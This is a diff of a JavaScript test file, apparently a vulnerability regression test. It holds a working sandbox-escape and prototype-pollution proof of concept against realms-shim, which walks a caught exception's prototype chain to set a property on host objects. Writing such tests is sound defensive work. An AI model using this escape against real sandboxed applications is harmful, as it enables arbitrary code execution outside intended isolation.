@@ -1,7 +1,3 @@
-//the code delete toString on globalObject
-// console.log({}.polluted);
-
-//https://security.snyk.io/vuln/npm:safe-eval:20170830
 test("Arbitrary code execution in realms-shim", () => {
   let Realm = require("realms-shim");
   const r = Realm.makeRootRealm();
@@ -15,10 +11,10 @@ test("Arbitrary code execution in realms-shim", () => {
           }catch(e){
                HostException = e;
           }
-          const HostObject = HostException.__proto__.__proto__.__proto__.constructor;
+          const HostObject = HostException.__proto__.__proto__.__proto__;
           HostObject.polluted = 'yes';
           `);
   } catch (error) {}
-
+  
   expect({}.polluted).toBe("yes");
 });
